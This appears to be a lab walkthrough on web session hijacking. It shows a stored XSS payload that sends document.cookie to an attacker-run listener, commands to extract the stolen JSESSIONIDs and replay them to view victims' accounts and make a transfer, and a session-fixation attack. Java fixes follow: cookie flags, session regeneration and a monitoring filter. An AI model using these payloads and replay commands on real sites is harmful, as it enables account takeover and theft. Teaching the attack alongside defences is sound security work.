// STEPS:
// 1. Open any web app in your browser
// 2. Press F12 to open Developer Tools
// 3. Firefox: Storage tab → Cookies
//    Chrome: Application tab → Cookies
// 4. Find JSESSIONID (or session_id, PHPSESSID)
// 5. Check these columns:
//    - HttpOnly: true or false?
//    - Secure: true or false?
//    - SameSite: Strict, Lax, or empty?

// WHAT YOU SHOULD SEE IN A VULNERABLE APP:
// Name: JSESSIONID
// Value: node0abc123xyz.node0
// HttpOnly: false   ← VULNERABLE!
// Secure: false     ← VULNERABLE!
// SameSite: (empty) ← VULNERABLE!

// STEP 1: Open a terminal and run:
// python3 -m http.server 8000
// Output: Serving HTTP on 0.0.0.0 port 8000 ...

// STEP 2: Test it with curl from another terminal:
// curl http://localhost:8000/?test=it_works

// STEP 3: Check the first terminal — you should see:
// 127.0.0.1 - [date] "GET /?test=it_works HTTP/1.1" 200 -

// The server logs EVERY request including the full URL.
// When an XSS sends a cookie, it appears in this log.

// IMPORTANT: Keep this terminal OPEN.
// The server stops when you close it or press Ctrl+C.

// PAYLOAD (enter in a profile description field):
// <script>
// var img = new Image();
// img.src = 'http://YOUR_IP:8000/?c=' + document.cookie;
// </script>

// WHAT HAPPENS:
// 1. Script creates an invisible Image object
// 2. Sets its source to your server URL + the cookie
// 3. Browser sends GET request to load the 'image'
// 4. Your server logs: GET /?c=JSESSIONID=node0abc123

// WHY Image() WORKS:
// - No Same-Origin restriction on image loads
// - No visible change on the page
// - No click needed from the victim
// - Works in virtually every browser

// Your server log shows:
// 127.0.0.1 - [06/Mar/2026 18:19:48] "GET /?c=JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0 HTTP/1.1" 200 -

// TO EXTRACT THE COOKIE:
// The cookie is between '?c=' and ' HTTP'
// Value: JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0

// COMMAND TO EXTRACT:
// grep -o 'JSESSIONID=[^ ]*' server.log
// Output: JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0

// FOR MULTIPLE UNIQUE SESSIONS:
// grep -o 'JSESSIONID=[^ ]*' server.log | sort -u

// COMMAND:
// curl http://localhost:15000/account \
//   --cookie 'JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0'

// EXPECTED OUTPUT:
// HTML containing the victim's:
// - Username (e.g., 'Welcome, user1')
// - Balance (e.g., '6701 $')
// - Card number (e.g., '111111')
// - Profile description

// PROOF OF HIJACKING:
// You're seeing user1's data without knowing their password.
// The server accepted the stolen cookie as valid authentication.

// COMMAND:
// curl -X POST http://localhost:15000/transfer \
//   -H 'Content-Type: application/x-www-form-urlencoded' \
//   -d 'to=999999&transferAmount=500' \
//   --cookie 'JSESSIONID=node01ph030it0lu6oswtt9m8c4hdb4.node0'

// WHAT THIS DOES:
// -X POST: sends a POST request (like submitting a form)
// -H: sets the Content-Type header
// -d: the form data (to=card_number, transferAmount=amount)
// --cookie: includes the stolen session cookie

// RESULT:
// The server processes this as a legitimate transfer
// from the victim's account to card 999999.
// Victim's balance decreases by 500$.

// SERVER LOG:
// 127.0.0.1 - [06/Mar 18:19] GET /?c=JSESSIONID=node016d4q... 200
// 127.0.0.1 - [06/Mar 19:26] GET /?c=JSESSIONID=node016d4q... 200
// 127.0.0.1 - [06/Mar 19:27] GET /?c=JSESSIONID=node016d4q... 200
// 127.0.0.1 - [06/Mar 19:28] GET /?c=JSESSIONID=node01ph03... 200
// 127.0.0.1 - [06/Mar 19:38] GET /?c=JSESSIONID=node01ph03... 200

// ANALYSIS:
// Session A: node016d4q (3 captures) = User 1
// Session B: node01ph03 (2 captures) = User 2
// Two different victims' cookies captured!

// VERIFY:
// curl /account --cookie A → shows user1 details
// curl /account --cookie B → shows different user details

// STEP 1: Attacker visits the app, gets a session cookie:
// curl -v http://localhost:15000/welcome 2>&1 | grep 'Set-Cookie'
// Set-Cookie: JSESSIONID=node0fixed123

// STEP 2: Attacker crafts a link with this session ID:
// http://localhost:15000/welcome?JSESSIONID=node0fixed123
// (Or uses a script to set the cookie in victim's browser)

// STEP 3: Victim clicks the link and logs in
// The session ID stays the same: node0fixed123
// But now it's AUTHENTICATED (victim is logged in)

// STEP 4: Attacker uses the KNOWN session ID:
// curl http://localhost:15000/account \
//   --cookie 'JSESSIONID=node0fixed123'
// → Shows the victim's account!

// DEFENCE:
// Regenerate session on login:
// session.invalidate();
// request.getSession(true);  ← NEW ID, old one is dead

// VULNERABLE CODE (Java):
Cookie session = new Cookie("JSESSIONID", sessionId);
response.addCookie(session);
// document.cookie returns: JSESSIONID=abc123

// SECURE CODE:
Cookie session = new Cookie("JSESSIONID", sessionId);
session.setHttpOnly(true);  // ← ADD THIS LINE
response.addCookie(session);
// document.cookie now returns: '' (empty!)

// TEST IN BROWSER CONSOLE (F12):
// Before fix: alert(document.cookie) → 'JSESSIONID=abc123'
// After fix: alert(document.cookie) → '' (nothing!)

// The XSS still EXECUTES (alert shows), but it can't
// READ the cookie. The chain is broken at cookie theft.

// COMPLETE SECURE COOKIE SETUP:
response.setHeader("Set-Cookie",
    "JSESSIONID=" + sessionId
    + "; HttpOnly"       // Block JavaScript access
    + "; Secure"         // HTTPS only
    + "; SameSite=Strict" // Same-site only
    + "; Path=/"          // Restrict to app path
    + "; Max-Age=1800"   // 30 minute timeout
);

// TESTING EACH FLAG:
// 1. HttpOnly: F12 → Console → document.cookie → empty?
// 2. Secure: Try HTTP (not HTTPS) → cookie not sent?
// 3. SameSite: Load page from different site → cookie not sent?
// 4. Max-Age: Wait 31 minutes → session expired?

// VULNERABLE LOGIN HANDLER:
protected void doPost(HttpServletRequest req, ...) {
    String user = req.getParameter("username");
    String pass = req.getParameter("password");
    if (authenticate(user, pass)) {
        // Session ID stays the SAME → fixation possible!
        req.getSession().setAttribute("user", user);
        resp.sendRedirect("/account");
    }
}

// SECURE LOGIN HANDLER:
protected void doPost(HttpServletRequest req, ...) {
    String user = req.getParameter("username");
    String pass = req.getParameter("password");
    if (authenticate(user, pass)) {
        req.getSession().invalidate();  // Kill old session
        HttpSession newSession = req.getSession(true); // New ID!
        newSession.setAttribute("user", user);
        resp.sendRedirect("/account");
    }
}
// Old session ID is now DEAD. Attacker's known ID is useless.

// SESSION SECURITY FILTER:
public class SessionMonitor implements Filter {
    public void doFilter(ServletRequest req, ...) {
        HttpServletRequest httpReq = (HttpServletRequest) req;
        HttpSession session = httpReq.getSession(false);

        if (session != null) {
            // Check 1: IP changed?
            String currentIP = httpReq.getRemoteAddr();
            String savedIP = (String) session.getAttribute("ip");
            if (savedIP != null && !savedIP.equals(currentIP)) {
                log.warn("IP CHANGE: " + savedIP + " → " + currentIP);
                session.invalidate();
                ((HttpServletResponse)resp).sendRedirect("/login");
                return;
            }
            session.setAttribute("ip", currentIP);

            // Check 2: User-Agent changed?
            String currentUA = httpReq.getHeader("User-Agent");
            String savedUA = (String) session.getAttribute("ua");
            if (savedUA != null && !savedUA.equals(currentUA)) {
                log.warn("UA CHANGE: possible hijacking!");
                session.invalidate();
                return;
            }
            session.setAttribute("ua", currentUA);
        }
        chain.doFilter(req, resp);
    }
}

